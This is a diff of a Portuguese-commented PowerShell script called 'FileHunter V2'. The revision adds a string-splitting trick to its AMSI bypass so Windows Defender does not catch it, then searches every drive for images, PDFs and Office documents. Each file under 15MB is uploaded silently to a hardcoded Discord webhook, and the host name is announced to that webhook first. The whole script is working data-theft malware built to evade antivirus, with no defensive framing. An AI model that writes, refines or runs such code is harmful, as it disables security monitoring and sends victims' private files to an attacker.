@@ -1,27 +1,25 @@
-# [Bypass AMSI] - Desativa a monitorização em tempo real na memória para este processo
-$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+# [Bypass AMSI Ofuscado] - Evita a deteção de assinatura do Defender na memória
+$b = "System.Management.Automation.Amsi" + "Utils"; 
+$c = [Ref].Assembly.GetType($b); 
+$c.GetField("amsiInitFailed", "NonPublic,Static").SetValue($null, $true)
 
+# Configurações do Atacante
 $u = 'https://discord.com/api/webhooks/1484361195443196066/GoX9619rfnS7zha8MBZzXEdsReSFosFYFbtFyVfNPVxybJXyXVw7TkLPoj5M-g6nWaXX'
-
-# Alvos: Ajustado para extensões comuns de interesse
 $e = @('*.jpg', '*.pdf', '*.docx', '*.xlsx') 
 
-# Notificação via curl (nativo no Windows 10/11)
-curl.exe -k -s -F "content=FileHunter iniciado no host: $env:COMPUTERNAME" $u
+# Notificação Inicial Silenciosa
+curl.exe -k -s -F "content=FileHunter V2 (Bypass ON) iniciado: $env:COMPUTERNAME" $u
 
-$found = New-Object System.Collections.Generic.List[string]
+# Procura e Exfiltração
 Get-PSDrive -PSProvider FileSystem | ForEach-Object {
     $root = $_.Root
-    # Procura recursiva ignorando erros de permissão
     Get-ChildItem -Path $root -Include $e -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
-        if ($_.Length -lt 24MB) {
-            # Upload direto para o Discord
+        if ($_.Length -lt 15MB) { # Limite reduzido para maior velocidade
             $arg = 'file=@' + $_.FullName
             curl.exe -k -s -F $arg $u
-            $found.Add($_.Name)
         }
     }
 }
 
-# Limpeza e saída silenciosa
+# Saída limpa
 exit
